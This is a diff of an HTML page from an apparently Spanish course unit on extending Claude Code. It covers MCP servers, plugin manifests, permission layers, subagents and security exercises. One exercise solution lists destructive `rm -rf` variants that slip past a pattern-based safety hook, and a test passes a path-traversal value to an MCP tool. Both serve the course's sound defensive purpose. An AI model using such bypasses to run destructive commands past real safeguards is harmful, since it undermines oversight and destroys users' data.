+<span id="cb11-20"><a href="#cb11-20" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-21"><a href="#cb11-21" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">"__main__"</span>:</span>
+<span id="cb11-22"><a href="#cb11-22" aria-hidden="true" tabindex="-1"></a>    mcp.run(transport<span class="op">=</span><span class="st">"stdio"</span>)</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p><strong>Decisiones de seguridad:</strong> solo <strong>lee</strong>; no abre red; el nombre del caso se valida contra una <strong>lista blanca</strong> (no se construye una ruta con lo que llega); las herramientas tienen docstring (lo que Claude ve para decidir cuándo usarlas).</p>
 <p><strong>Resultado comprobado</strong> (con el cliente del SDK en <code>cliente_prueba.py</code>, sin Claude): el servidor anuncia dos herramientas (<code>listar_casos</code>, <code>resumen_csv</code>); <code>listar_casos</code> devuelve los cinco casos; <code>resumen_csv("a_ventas")</code> devuelve 109 filas, 4 columnas y <strong>5 ausentes en <code>ventas_eur</code></strong>; <code>resumen_csv("../../CLAUDE")</code> produce un <strong>error</strong> (rechazo de la ruta). <strong>No</strong> se ha conectado a Claude Code.</p>
 <p><strong>MCP frente a un script.</strong> No todo necesita un servidor MCP:</p>
@@ -947,16 +1005,55 @@ div.csl-indent {
 <div class="no-row-height column-margin column-container"><div id="ref-anthropic-extender" class="csl-entry" role="listitem">
 <em>Extend Claude Code</em>. 2026. Documentación de Claude Code (Anthropic), consultada el 23-10-2026. <a href="https://code.claude.com/docs/en/features-overview">https://code.claude.com/docs/en/features-overview</a>.
 </div></div><p><strong>Cuándo empaquetar:</strong> cuando un <strong>segundo repositorio</strong> necesita la misma configuración. Mientras sirvas a un proyecto, <code>.claude/</code> (skills, agentes, hooks) y <code>.mcp.json</code> versionados bastan.</p>
-<p><strong>Riesgo:</strong> instalar un plugin de terceros es instalar <strong>hooks, skills y servidores</strong> que se ejecutan con tus permisos. Aplica lo de C7.3, C7.5 y C7.6: léelo antes, confía solo en fuentes conocidas y fija versiones. <em>Esta sección se basa solo en la página de visión general de la extensibilidad; la de plugins no se ha leído completa.</em></p>
+<p><strong>Estructura mínima</strong> (referencia del manifiesto consultada el 25-11-2026 <span class="citation" data-cites="anthropic-plugins">(<a href="#ref-anthropic-plugins" role="doc-biblioref"><em>Plugins reference</em> 2026</a>)</span>). Cada componente va en su carpeta por omisión, en la raíz del plugin; el manifiesto <code>.claude-plugin/plugin.json</code> es opcional y su único campo obligatorio es <code>name</code> (en minúsculas y con guiones, sin empezar por <code>claude-</code> ni <code>anthropic-</code>, que están reservados):</p>
+<div class="no-row-height column-margin column-container"></div><pre class="text"><code>validar-datos/                 un plugin que reúne la skill y el hook de esta unidad
+├── .claude-plugin/
+│   └── plugin.json            manifiesto: nombre, versión, descripción, engines
+├── skills/
+│   └── validar-tabla/SKILL.md
+├── hooks/
+│   └── hooks.json             la misma forma que el bloque "hooks" de settings.json
+└── scripts/
+    └── validar-comando.sh     lo llama hooks.json con "${CLAUDE_PLUGIN_ROOT}"/scripts/…</code></pre>
+<p><strong>Declarar con qué versiones funciona: <code>engines</code>.</strong> Un plugin depende de la versión de Claude Code: si su <code>hooks.json</code> usa <code>PreSkillShellCommand</code>, en una versión anterior a la 2.1.332 ese hook no protege nada. Desde Claude Code 2.1.323, el manifiesto admite <code>engines</code> con un rango de versiones al estilo de <em>semver</em> bajo la clave <code>claude-code</code> <span class="citation" data-cites="anthropic-plugins anthropic-changelog">(<a href="#ref-anthropic-plugins" role="doc-biblioref"><em>Plugins reference</em> 2026</a>; <a href="#ref-anthropic-changelog" role="doc-biblioref"><em>Changelog</em> 2026</a>)</span>:</p>
+<div class="no-row-height column-margin column-container"></div><div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb13"><pre class="sourceCode json code-with-copy"><code class="sourceCode json"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">"name"</span><span class="fu">:</span> <span class="st">"validar-datos"</span><span class="fu">,</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">"version"</span><span class="fu">:</span> <span class="st">"0.1.0"</span><span class="fu">,</span></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">"description"</span><span class="fu">:</span> <span class="st">"Valida tablas de datos y bloquea órdenes de shell de riesgo"</span><span class="fu">,</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">"engines"</span><span class="fu">:</span> <span class="fu">{</span> <span class="dt">"claude-code"</span><span class="fu">:</span> <span class="st">"&gt;=2.1.332"</span> <span class="fu">}</span></span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<p><code>version</code> es la versión <strong>del plugin</strong>; <code>engines</code>, la de <strong>Claude Code</strong> que necesita. Un matiz de compatibilidad que da la referencia: las versiones 2.0.15 a 2.1.75 rechazan el manifiesto entero si lleva <code>engines</code>, de modo que un plugin que deba funcionar en ellas no puede usar el campo. La referencia consultada no detalla qué hace exactamente Claude Code cuando la versión instalada queda fuera del rango; compruébalo en la pestaña de errores de <code>/plugin</code>.</p>
+<p><strong>Comprobar el manifiesto: <code>claude plugin validate</code>.</strong> Antes de compartir un plugin, valídalo desde la terminal:</p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb14"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">claude</span> plugin validate ./validar-datos            <span class="co"># «Validation passed», «… with warnings» o «Validation failed»</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">claude</span> plugin validate <span class="at">--strict</span> ./validar-datos   <span class="co"># los avisos también hacen fallar (código 1): útil en integración continua</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<p>Detecta, entre otras cosas, tipos de campo erróneos, rutas que no existen o que salen de la carpeta del plugin (<code>..</code>), campos desconocidos (aviso: Claude Code los descarta al cargar), nombres reservados y entradas de servidores MCP que no se cargarían <span class="citation" data-cites="anthropic-plugins">(<a href="#ref-anthropic-plugins" role="doc-biblioref"><em>Plugins reference</em> 2026</a>)</span>. Para probarlo <strong>sin instalarlo</strong>, arranca una sesión con <code>claude --plugin-dir ./validar-datos</code>, que lo carga solo para esa sesión. Las órdenes <code>plugin validate</code> (con <code>--strict</code> y <code>--json</code>) y <code>--plugin-dir</code> figuran en <code>claude --help</code> del binario 2.1.330; la validación de un plugin de prueba <strong>no</strong> llegó a ejecutarse en la revisión (el entorno de trabajo no lo permitió), así que los mensajes citados proceden de la documentación.</p>
+<div class="no-row-height column-margin column-container"><div id="ref-anthropic-plugins" class="csl-entry" role="listitem">
+<em>Plugins reference</em>. 2026. Documentación de Claude Code (Anthropic), consultada el 25-11-2026. <a href="https://code.claude.com/docs/en/plugins-reference">https://code.claude.com/docs/en/plugins-reference</a>.
+</div></div><p><strong>Riesgo:</strong> instalar un plugin de terceros es instalar <strong>hooks, skills y servidores</strong> que se ejecutan con tus permisos. Aplica lo de C7.3, C7.5 y C7.6: léelo antes, confía solo en fuentes conocidas y fija versiones. Que <code>claude plugin validate</code> pase solo dice que el manifiesto <strong>se carga</strong>, no que el plugin sea seguro.</p>
+<p><strong>Pon a prueba lo anterior.</strong></p>
+<div id="c7-8-engines" class="ejercicio" data-tipo="opcion" data-respuesta="b">
+<p>El <code>hooks.json</code> de tu plugin usa el evento <code>PreSkillShellCommand</code>, que existe desde Claude Code 2.1.332. ¿Cómo lo declaras en <code>plugin.json</code>?</p>
+<div class="opciones">
+<ul>
+<li><code>"version": "2.1.332"</code></li>
+<li><code>"engines": { "claude-code": "&gt;=2.1.332" }</code></li>
+<li>No hace falta: Claude Code ignora los eventos que no conoce sin avisar.</li>
+<li><code>"name": "claude-code-2.1.332"</code></li>
+</ul>
+</div>
+<div class="solucion">
+<p><code>engines</code> declara las versiones de <strong>Claude Code</strong> con las que funciona el plugin; <code>version</code> es la versión del propio plugin. Un evento que tu versión no conoce no protege nada (según la documentación, antes de la 2.1.332 las órdenes inyectadas se ejecutan sin llamar al hook), y un nombre que empieza por <code>claude-</code> está reservado. Valida después el manifiesto con <code>claude plugin validate</code>.</p>
+</div>
+</div>
 </section>
-<section id="c7-9" class="level3">
+<section id="c7-9" class="level3 page-columns page-full">
 <h3 class="anchored" data-anchor-id="c7-9">C7.9 Permisos y seguridad de la configuración</h3>
 <p>Todo lo anterior son <strong>maneras de ampliar</strong> lo que Claude Code puede hacer. Antes de añadir nada, pregúntate lo de C2.10: ¿con qué <strong>privilegio</strong> se ejecuta y qué ocurre si falla o lo manipulan?</p>
 <p><strong>Orden de defensas</strong> (de lo más a lo menos fiable):</p>
 <ol type="1">
 <li><strong>Sandbox y aislamiento</strong> (contenedores, máquinas virtuales): limitan el daño real. En Windows nativo el sandbox de Claude Code no está disponible (se necesita WSL 2).</li>
 <li><strong>Reglas <code>deny</code></strong> de permisos: bloquean sin preguntar.</li>
-<li><strong>Hooks <code>PreToolUse</code></strong>: refuerzo determinista, por patrones.</li>
+<li><strong>Hooks <code>PreToolUse</code></strong> (y <code>PreSkillShellCommand</code> para las órdenes que inyectan las skills): refuerzo determinista, por patrones.</li>
 <li><strong>Reglas <code>ask</code></strong> y revisión humana del diff.</li>
 <li><strong><code>CLAUDE.md</code>, skills</strong>: instrucciones que se suelen cumplir; <strong>no</strong> son una garantía.</li>
 </ol>
@@ -964,11 +1061,15 @@ div.csl-indent {
 <ul>
 <li><strong>Nada de secretos</strong> en ficheros versionados (<code>settings.json</code>, <code>.mcp.json</code>, <code>CLAUDE.md</code>): usa variables de entorno, <code>.local.json</code> (no versionado) o el almacén del sistema.</li>
 <li><strong>Mínimo privilegio:</strong> <code>allowed-tools</code> y reglas <code>allow</code> lo más estrechas posible; sin comodines amplios.</li>
-<li><strong>Revisa lo que viene de fuera</strong> antes de aceptar la confianza de una carpeta: <code>.claude/settings.json</code>, hooks, skills y <code>.mcp.json</code> de un repositorio ajeno se ejecutan con tus permisos.</li>
+<li><strong>Revisa lo que viene de fuera</strong> antes de aceptar la confianza de una carpeta: <code>.claude/settings.json</code>, hooks, skills y <code>.mcp.json</code> de un repositorio ajeno se ejecutan con tus permisos. El propio diálogo de confianza ayuda a hacerlo: según la documentación de permisos, enumera las reglas <code>allow</code> y las carpetas adicionales que el proyecto concedería <span class="citation" data-cites="anthropic-permisos">(<a href="#ref-anthropic-permisos" role="doc-biblioref"><em>Configure permissions</em> 2026</a>)</span>, y según el registro de cambios, desde Claude Code 2.1.329 indica además <strong>dónde se declaran los hooks</strong> de la carpeta <span class="citation" data-cites="anthropic-changelog">(<a href="#ref-anthropic-changelog" role="doc-biblioref"><em>Changelog</em> 2026</a>)</span> (esto último no se ha comprobado). Úsalo como <strong>índice</strong> de lo que tienes que abrir y leer, no como revisión: el diálogo dice dónde están los hooks, no lo que hacen. Y recuerda que <code>claude -p</code> no muestra este diálogo (C8.1).</li>
 <li><strong>Versiona</strong> la configuración del proyecto y haz que pase <strong>revisión</strong> como el código.</li>
 <li><strong>Comprueba</strong> lo configurado: <code>/permissions</code>, <code>/hooks</code>, <code>/skills</code>, <code>/mcp</code>, <code>/status</code>.</li>
 </ul>
-<p><strong>Pon a prueba lo anterior.</strong></p>
+<div class="no-row-height column-margin column-container"><div id="ref-anthropic-permisos" class="csl-entry" role="listitem">
+<em>Configure permissions</em>. 2026. Documentación de Claude Code (Anthropic), consultada el 23-10-2026. <a href="https://code.claude.com/docs/en/permissions">https://code.claude.com/docs/en/permissions</a>.
+</div><div id="ref-anthropic-changelog" class="csl-entry" role="listitem">
+<em>Changelog</em>. 2026. Documentación de Claude Code (Anthropic) y CHANGELOG.md de anthropics/claude-code, consultados el 25-11-2026. <a href="https://code.claude.com/docs/en/changelog">https://code.claude.com/docs/en/changelog</a>.
+</div></div><p><strong>Pon a prueba lo anterior.</strong></p>
 <div id="c7-9-clonar" class="ejercicio" data-tipo="opcion" data-respuesta="c">
 <p>Clonas un repositorio ajeno y Claude Code te pide confiar en la carpeta. ¿Qué haces antes de aceptar?</p>
 <div class="opciones">
@@ -989,13 +1090,13 @@ div.csl-indent {
 <p>Un <strong>subagente</strong> es un trabajador con su <strong>propio contexto</strong>, sus propias herramientas y permisos; solo su resumen vuelve a la conversación principal. Se define con un fichero Markdown con cabecera YAML en <code>.claude/agents/</code> (proyecto) o <code>~/.claude/agents/</code> (usuario); <code>name</code> y <code>description</code> son obligatorios <span class="citation" data-cites="anthropic-subagentes">(<a href="#ref-anthropic-subagentes" role="doc-biblioref"><em>Create custom subagents</em> 2026</a>)</span>. Ejemplo, <code>_ejemplo/agentes/revisor-datos.md</code>: un revisor de análisis de datos de <strong>solo lectura</strong>.</p>
 <div class="no-row-height column-margin column-container"><div id="ref-anthropic-subagentes" class="csl-entry" role="listitem">
 <em>Create custom subagents</em>. 2026. Documentación de Claude Code (Anthropic), consultada el 23-10-2026. <a href="https://code.claude.com/docs/en/sub-agents">https://code.claude.com/docs/en/sub-agents</a>.
-</div></div><div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb8"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co">---</span></span>
-<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="an">name:</span><span class="co"> revisor-datos</span></span>
-<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="an">description:</span><span class="co"> Revisa un análisis de datos ya hecho (código y resultados) buscando errores de método, ausentes mal tratados y conclusiones que los datos no apoyan. Úsalo para una segunda opinión antes de entregar un informe.</span></span>
-<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="an">tools:</span><span class="co"> Read, Grep, Glob</span></span>
-<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="an">model:</span><span class="co"> sonnet</span></span>
-<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="co">---</span></span>
-<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>Eres un revisor de análisis de datos. … **No modificas nada.**</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+</div></div><div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb15"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="co">---</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="an">name:</span><span class="co"> revisor-datos</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="an">description:</span><span class="co"> Revisa un análisis de datos ya hecho (código y resultados) buscando errores de método, ausentes mal tratados y conclusiones que los datos no apoyan. Úsalo para una segunda opinión antes de entregar un informe.</span></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="an">tools:</span><span class="co"> Read, Grep, Glob</span></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="an">model:</span><span class="co"> sonnet</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a><span class="co">---</span></span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>Eres un revisor de análisis de datos. … **No modificas nada.**</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p><strong>Campos útiles</strong> (documentación consultada el 23-10-2026): <code>tools</code> (lista de herramientas permitidas; si se omite, hereda todas), <code>disallowedTools</code>, <code>model</code> (<code>sonnet</code>, <code>opus</code>, <code>haiku</code>, <code>fable</code>, un identificador o <code>inherit</code>), <code>permissionMode</code>, <code>isolation: worktree</code>, <code>skills</code> (se precargan completas), <code>memory</code>, <code>maxTurns</code>, <code>mcpServers</code> y <code>hooks</code>. Se invocan nombrándolos («usa el subagente revisor-datos»), con <code>@agent-&lt;nombre&gt;</code> o con <code>claude --agent &lt;nombre&gt;</code> para toda la sesión. <strong>Usa un subagente</strong> cuando la tarea produce mucho texto que no necesitas en tu contexto o quieres restringir herramientas; <strong>usa la conversación principal</strong> si necesitas ir y venir o es un cambio pequeño.</p>
 <p><strong>Matices:</strong> un subagente <strong>no ve tu conversación</strong>, solo el mensaje que Claude le escribe; por defecto puede crear sus propios subagentes hasta tres niveles por debajo de la conversación principal (se limita con <code>CLAUDE_CODE_MAX_SUBAGENT_SPAWN_DEPTH</code>) y se ejecutan como máximo 20 a la vez; los subagentes <strong>no</strong> son lo mismo que los <em>worktrees</em> (que aíslan <strong>ficheros</strong>, C3.10) ni que los equipos de agentes (experimentales, C8). <strong>No</strong> se ha ejecutado este subagente dentro de Claude Code.</p>
 </section>
@@ -1034,6 +1135,7 @@ div.csl-indent {
 <li>Ejecuta tú el script de prueba <strong>sin</strong> Claude Code: ¿todos los casos dan el código esperado?</li>
 <li>Compara los nombres de campos (<code>tool_input.command</code>, <code>matcher</code>, <code>hooks</code>) con <code>/hooks</code> y con la documentación vigente.</li>
 <li>¿Admite que un patrón de texto se puede esquivar (<code>rm  -rf</code>, variables)? ¿Qué propone para reforzarlo?</li>
+<li>¿Qué pasa si el script falla (por ejemplo, falta <code>jq</code>)? ¿Propone <code>onFailure</code> y explica qué se gana y qué se pierde al fallar cerrado?</li>
 <li>¿Mezcla Bash con PowerShell? Comprueba que la variante de tu sistema no usa <code>jq</code> ni <code>[[ ]]</code> si eres de Windows.</li>
 </ul>
 </div>
@@ -1043,6 +1145,25 @@ div.csl-indent {
 <h2 class="anchored" data-anchor-id="ejercicios">Ejercicios</h2>
 <ol type="1">
 <li><p><strong>Mecanismo.</strong> Para cada necesidad elige el mecanismo y justifícalo: a) «siempre responde en español de España»; b) «antes de cada commit, ejecuta las pruebas»; c) «consultar las incidencias de mi gestor de proyectos»; d) «revisar 200 ficheros sin llenar mi contexto»; e) una checklist de publicación que lanzo yo con <code>/release</code>.</p>
+<div class="callout callout-style-default callout-note callout-titled" title="Solución">
+<div class="callout-header d-flex align-content-center collapsed" data-bs-toggle="collapse" data-bs-target=".callout-5-contents" aria-controls="callout-5" aria-expanded="false" aria-label="Toggle callout">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<div class="callout-title-container flex-fill">
+<span class="screen-reader-only">Nota</span>Solución
+</div>
+<div class="callout-btn-toggle d-inline-block border-0 py-1 ps-1 pe-0 float-end"><i class="callout-toggle"></i></div>
+</div>
+<div id="callout-5" class="callout-5-contents callout-collapse collapse">
+<div class="callout-body-container callout-body">
+<ol type="a">
+<li><code>CLAUDE.md</code>. b) Hook (determinista; o un <code>PreToolUse</code> sobre <code>git commit</code>). c) MCP. d) Subagente (contexto aislado, devuelve un resumen). e) Skill con <code>disable-model-invocation: true</code>.</li>
+</ol>
+</div>
+</div>
+</div></li>
+<li><p><strong>Rompe tu hook.</strong> Añade a <code>validar-comando.sh</code> un fallo (por ejemplo, una errata en <code>jq</code>) y comprueba con el script de prueba qué pasa. ¿Bloquea o deja pasar? ¿Por qué importa?</p>
 <div class="callout callout-style-default callout-note callout-titled" title="Solución">
 <div class="callout-header d-flex align-content-center collapsed" data-bs-toggle="collapse" data-bs-target=".callout-6-contents" aria-controls="callout-6" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
@@ -1055,13 +1176,11 @@ div.csl-indent {
 </div>
 <div id="callout-6" class="callout-6-contents callout-collapse collapse">
 <div class="callout-body-container callout-body">
-<ol type="a">
-<li><code>CLAUDE.md</code>. b) Hook (determinista; o un <code>PreToolUse</code> sobre <code>git commit</code>). c) MCP. d) Subagente (contexto aislado, devuelve un resumen). e) Skill con <code>disable-model-invocation: true</code>.</li>
-</ol>
+<p>Con un fallo del propio script (código distinto de 0 y 2) la orden <strong>no se bloquea</strong>: el hook roto no protege. El script de prueba lo detecta si incluye casos que deben dar 2.</p>
 </div>
 </div>
 </div></li>
-<li><p><strong>Rompe tu hook.</strong> Añade a <code>validar-comando.sh</code> un fallo (por ejemplo, una errata en <code>jq</code>) y comprueba con el script de prueba qué pasa. ¿Bloquea o deja pasar? ¿Por qué importa?</p>
+<li><p><strong>Esquiva.</strong> Encuentra una orden peligrosa que <code>validar-comando.sh</code> <strong>no</strong> bloquee (pista: espacios, variables, rutas absolutas) y propón una mejora o una capa adicional.</p>
 <div class="callout callout-style-default callout-note callout-titled" title="Solución">
 <div class="callout-header d-flex align-content-center collapsed" data-bs-toggle="collapse" data-bs-target=".callout-7-contents" aria-controls="callout-7" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
@@ -1074,11 +1193,12 @@ div.csl-indent {
 </div>
 <div id="callout-7" class="callout-7-contents callout-collapse collapse">
 <div class="callout-body-container callout-body">
-<p>Con un fallo del propio script (código distinto de 0 y 2) la orden <strong>no se bloquea</strong>: el hook roto no protege. El script de prueba lo detecta si incluye casos que deben dar 2.</p>
+<p><code>rm  -rf x</code> (dos espacios), <code>/bin/rm -r -f x</code>, o <code>a="rm -rf"; $a x</code> esquivan el patrón. Mejoras: normalizar espacios, y sobre todo reforzar con reglas <code>deny</code> de permisos y con un sandbox; ningún filtro de texto es completo.</p>
 </div>
 </div>
 </div></li>
-<li><p><strong>Esquiva.</strong> Encuentra una orden peligrosa que <code>validar-comando.sh</code> <strong>no</strong> bloquee (pista: espacios, variables, rutas absolutas) y propón una mejora o una capa adicional.</p>
+<li><p><strong>Skill nueva.</strong> Escribe una skill <code>/resumir-incidencias</code> que lea un CSV de incidencias y produzca un resumen <strong>sin modificar nada</strong> y con <code>disable-model-invocation: true</code>. Escribe una prueba para su script.</p></li>
+<li><p><strong>Servidor MCP.</strong> Añade al servidor una herramienta <code>columnas(caso)</code> que devuelva solo las columnas. ¿Qué validaciones necesita? Pruébala con el cliente del SDK.</p>
 <div class="callout callout-style-default callout-note callout-titled" title="Solución">
 <div class="callout-header d-flex align-content-center collapsed" data-bs-toggle="collapse" data-bs-target=".callout-8-contents" aria-controls="callout-8" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
@@ -1091,12 +1211,11 @@ div.csl-indent {
 </div>
 <div id="callout-8" class="callout-8-contents callout-collapse collapse">
 <div class="callout-body-container callout-body">
-<p><code>rm  -rf x</code> (dos espacios), <code>/bin/rm -r -f x</code>, o <code>a="rm -rf"; $a x</code> esquivan el patrón. Mejoras: normalizar espacios, y sobre todo reforzar con reglas <code>deny</code> de permisos y con un sandbox; ningún filtro de texto es completo.</p>
+<p>La misma lista blanca del nombre del caso, tipo de retorno claro y docstring; sin abrir ficheros distintos de los del caso. Se prueba como <code>resumen_csv</code>: caso válido y una ruta maliciosa.</p>
 </div>
 </div>
 </div></li>
-<li><p><strong>Skill nueva.</strong> Escribe una skill <code>/resumir-incidencias</code> que lea un CSV de incidencias y produzca un resumen <strong>sin modificar nada</strong> y con <code>disable-model-invocation: true</code>. Escribe una prueba para su script.</p></li>
-<li><p><strong>Servidor MCP.</strong> Añade al servidor una herramienta <code>columnas(caso)</code> que devuelva solo las columnas. ¿Qué validaciones necesita? Pruébala con el cliente del SDK.</p>
+<li><p><strong>Empaqueta.</strong> Reúne en un plugin <code>validar-datos</code> la skill <code>validar-tabla</code> y el hook <code>validar-comando.sh</code> (registrado en <code>PreToolUse</code> y, si tu versión es la 2.1.332 o posterior, en <code>PreSkillShellCommand</code>). Escribe su <code>plugin.json</code> con <code>engines</code> y pásalo por <code>claude plugin validate --strict</code>. Después, introduce un error a propósito (una ruta con <code>..</code> o un campo con un tipo equivocado) y comprueba que la validación falla.</p>
 <div class="callout callout-style-default callout-note callout-titled" title="Solución">
 <div class="callout-header d-flex align-content-center collapsed" data-bs-toggle="collapse" data-bs-target=".callout-9-contents" aria-controls="callout-9" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
@@ -1109,7 +1228,7 @@ div.csl-indent {
 </div>
 <div id="callout-9" class="callout-9-contents callout-collapse collapse">
 <div class="callout-body-container callout-body">
-<p>La misma lista blanca del nombre del caso, tipo de retorno claro y docstring; sin abrir ficheros distintos de los del caso. Se prueba como <code>resumen_csv</code>: caso válido y una ruta maliciosa.</p>
+<p>Estructura de C7.8; en <code>hooks/hooks.json</code>, la orden apunta a <code>"${CLAUDE_PLUGIN_ROOT}"/scripts/validar-comando.sh</code> (no a <code>$CLAUDE_PROJECT_DIR</code>, porque el script viaja con el plugin). <code>engines</code> debe pedir la versión mínima de lo que uses (<code>&gt;=2.1.332</code> si declaras <code>PreSkillShellCommand</code>). Con <code>--strict</code>, un aviso (por ejemplo, falta <code>description</code>) ya da código 1. Prueba el resultado con <code>claude --plugin-dir ./validar-datos</code> y <code>/hooks</code> antes de instalarlo.</p>
 </div>
 </div>
 </div></li>
@@ -1121,7 +1240,8 @@ div.csl-indent {
 <li>Elijo entre <code>CLAUDE.md</code>, skill, hook, subagente y MCP sin atribuir a uno lo que hace otro.</li>
 <li>Escribo una skill con descripción útil, argumentos y <em>scripts</em> con pruebas, y sé qué riesgo tiene <code>allowed-tools</code>.</li>
 <li>Escribo un hook de validación previa y otro de comprobación, y los <strong>pruebo sin Claude</strong> con JSON de muestra.</li>
-<li>Sé que solo el código 2 (o un <code>deny</code>) bloquea y que un hook roto no protege.</li>
+<li>Sé que solo el código 2 (o un <code>deny</code>) bloquea, que un hook roto no protege salvo con <code>onFailure: "block"</code>, y que las órdenes inyectadas de una skill necesitan <code>PreSkillShellCommand</code>.</li>
+<li>Empaqueto un plugin con <code>engines</code> y lo compruebo con <code>claude plugin validate</code> antes de compartirlo.</li>
 <li>Defino un subagente con herramientas limitadas.</li>
 <li>Conecto un servidor MCP en el ámbito adecuado y conozco sus riesgos (confianza e inyección).</li>
 <li>Escribo un servidor MCP de solo lectura con validación de entradas.</li>
@@ -1131,7 +1251,7 @@ div.csl-indent {
 </section>
 <section id="referencias-de-esta-unidad" class="level2">
 <h2 class="anchored" data-anchor-id="referencias-de-esta-unidad">Referencias de esta unidad</h2>
-<p>Documentación oficial de Claude Code (versión 2.1.309, consultada el 23-10-2026): <a href="https://code.claude.com/docs/en/features-overview">extender Claude Code</a>, <a href="https://code.claude.com/docs/en/hooks-guide">hooks</a>, <a href="https://code.claude.com/docs/en/skills">skills</a>, <a href="https://code.claude.com/docs/en/sub-agents">subagentes</a> y <a href="https://code.claude.com/docs/en/mcp">MCP</a>.</p>
+<p>Documentación oficial de Claude Code (versión 2.1.309, consultada el 23-10-2026): <a href="https://code.claude.com/docs/en/features-overview">extender Claude Code</a>, <a href="https://code.claude.com/docs/en/hooks-guide">hooks</a>, <a href="https://code.claude.com/docs/en/skills">skills</a>, <a href="https://code.claude.com/docs/en/sub-agents">subagentes</a> y <a href="https://code.claude.com/docs/en/mcp">MCP</a>. En la revisión del 25-11-2026 (novedades de 2.1.312 a 2.1.332) se consultaron además la <a href="https://code.claude.com/docs/en/hooks">referencia de hooks</a>, la <a href="https://code.claude.com/docs/en/plugins-reference">referencia del manifiesto de plugins</a>, la de <a href="https://code.claude.com/docs/en/permissions">permisos</a> y el <a href="https://code.claude.com/docs/en/changelog">registro de cambios</a>.</p>
 
 
 </section>
@@ -1143,7 +1263,10 @@ div.csl-indent {
 <p><em>Automate actions with hooks</em>. 2026. Documentación de Claude Code (Anthropic), consultada el 23-10-2026. <a href="https://code.claude.com/docs/en/hooks-guide">https://code.claude.com/docs/en/hooks-guide</a>.</p>
 </div>
 <div class="ref-final">
-<p><em>Changelog</em>. 2026. Documentación de Claude Code (Anthropic), consultada el 03-11-2026. <a href="https://code.claude.com/docs/en/changelog">https://code.claude.com/docs/en/changelog</a>.</p>
+<p><em>Changelog</em>. 2026. Documentación de Claude Code (Anthropic) y CHANGELOG.md de anthropics/claude-code, consultados el 25-11-2026. <a href="https://code.claude.com/docs/en/changelog">https://code.claude.com/docs/en/changelog</a>.</p>
+</div>
+<div class="ref-final">
+<p><em>Configure permissions</em>. 2026. Documentación de Claude Code (Anthropic), consultada el 23-10-2026. <a href="https://code.claude.com/docs/en/permissions">https://code.claude.com/docs/en/permissions</a>.</p>
 </div>
 <div class="ref-final">
 <p><em>Connect Claude Code to tools via MCP</em>. 2026. Documentación de Claude Code (Anthropic), consultada el 23-10-2026. <a href="https://code.claude.com/docs/en/mcp">https://code.claude.com/docs/en/mcp</a>.</p>
@@ -1156,6 +1279,9 @@ div.csl-indent {
 </div>
 <div class="ref-final">
 <p><em>Extend Claude with skills</em>. 2026. Documentación de Claude Code (Anthropic), consultada el 23-10-2026. <a href="https://code.claude.com/docs/en/skills">https://code.claude.com/docs/en/skills</a>.</p>
+</div>
+<div class="ref-final">
+<p><em>Plugins reference</em>. 2026. Documentación de Claude Code (Anthropic), consultada el 25-11-2026. <a href="https://code.claude.com/docs/en/plugins-reference">https://code.claude.com/docs/en/plugins-reference</a>.</p>
 </div>
 </div>
 <script>(function(){var a=document.getElementById('toc-bibliography');if(a&&a.parentElement)a.parentElement.remove();})();</script>
